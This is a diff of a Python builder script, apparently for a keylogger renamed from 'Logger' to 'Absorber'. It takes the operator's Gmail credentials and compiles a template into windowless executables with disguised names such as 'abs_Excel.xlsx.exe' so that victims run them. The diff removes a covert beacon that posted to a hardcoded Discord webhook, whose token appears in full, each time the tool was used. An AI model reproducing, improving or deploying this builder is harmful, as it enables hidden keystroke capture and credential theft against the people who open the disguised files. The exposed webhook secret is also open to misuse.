@@ -1,21 +1,21 @@
 import os
 import sys
-import requests
 from datetime import datetime, timedelta 
 from getpass import getpass
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
-header = ('{0}Logger{1} > {2}'.format(YELLOW, WHITE, END))
+header = ('{0}Absorber{1} > {2}'.format(YELLOW, WHITE, END))
 
 os.system('cls')
 print("""
-██       ██████   ██████   ██████  ███████ ██████  
-██      ██    ██ ██       ██       ██      ██   ██ 
-██      ██    ██ ██   ███ ██   ███ █████   ██████  
-██      ██    ██ ██    ██ ██    ██ ██      ██   ██ 
-███████  ██████   ██████   ██████  ███████ ██   ██ 
+                                 █████╗ ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
+                                ██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+                                ███████║██████╔╝███████╗██║   ██║██████╔╝██████╔╝█████╗  ██████╔╝
+                                ██╔══██║██╔══██╗╚════██║██║   ██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
+                                ██║  ██║██████╔╝███████║╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║
+                                ╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
 """)
-print ('\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORKS WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END))
+print ('\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END))
 print('\n')
 os.system('copy Template\log.py .\log.py >nul')
 email = input(BLUE + 'Enter your email: ' + END)
@@ -57,11 +57,6 @@ if choice == '1':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
-    Message = {
-        "content": "Someone has used Logger!"
-    }
-    requests.post(discord_webhook_url, data=Message)
     sys.exit()
 
 elif choice == '2':
@@ -73,12 +68,7 @@ elif choice == '2':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
-    Message = {
-        "content": "Someone has used Logger!"
-    }
-    requests.post(discord_webhook_url, data=Message)
-    sys.exit()
+    sys.exit()    
 
 elif choice == '3':
     name = 'abs_Excel.xlsx.exe'
@@ -89,11 +79,6 @@ elif choice == '3':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
-    Message = {
-        "content": "Someone has used Logger!"
-    }
-    requests.post(discord_webhook_url, data=Message)
     sys.exit()
 
 elif choice == '4':
@@ -105,11 +90,6 @@ elif choice == '4':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
-    Message = {
-        "content": "Someone has used Logger!"
-    }
-    requests.post(discord_webhook_url, data=Message)
     sys.exit()
 
 elif choice == '5':
@@ -121,15 +101,10 @@ elif choice == '5':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
-    Message = {
-        "content": "Someone has used Logger!"
-    }
-    requests.post(discord_webhook_url, data=Message)
     sys.exit()
 
 elif choice == '6':
-    name = 'Logger.exe'
+    name = 'absorber.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest -F log.py')
     os.system('rmdir /S /Q build __pycache__')
@@ -137,12 +112,7 @@ elif choice == '6':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
-    Message = {
-        "content": "Someone has used Logger!"
-    }
-    requests.post(discord_webhook_url, data=Message)
-    sys.exit()
+    sys.exit()            
 
 else:
-	sys.exit(RED + 'Wrong choice. Please enter right choice next time.' + END)
+	sys.exit(RED + 'Wrong choice.Please enter right choice next time.' + END)
